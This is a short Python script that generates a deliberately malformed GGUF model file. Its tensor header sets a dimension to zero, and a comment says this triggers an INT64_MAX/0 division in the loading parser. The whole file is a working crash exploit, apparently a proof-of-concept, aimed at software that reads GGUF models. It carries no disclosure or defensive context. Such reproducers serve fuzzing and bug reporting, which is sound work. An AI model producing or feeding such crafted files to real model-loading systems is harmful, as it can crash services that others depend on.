#!/usr/bin/env python3
import struct, sys

magic     = b'GGUF'
version   = struct.pack('<I', 3)
n_tensors = struct.pack('<q', 1)
n_kv      = struct.pack('<q', 0)
name_len  = struct.pack('<Q', 1)
name      = b'x'
n_dims    = struct.pack('<I', 2)
ne0       = struct.pack('<q', 1)
ne1       = struct.pack('<q', 0)   # ← triggers INT64_MAX/0

data = magic + version + n_tensors + n_kv + name_len + name + n_dims + ne0 + ne1
sys.stdout.buffer.write(data)
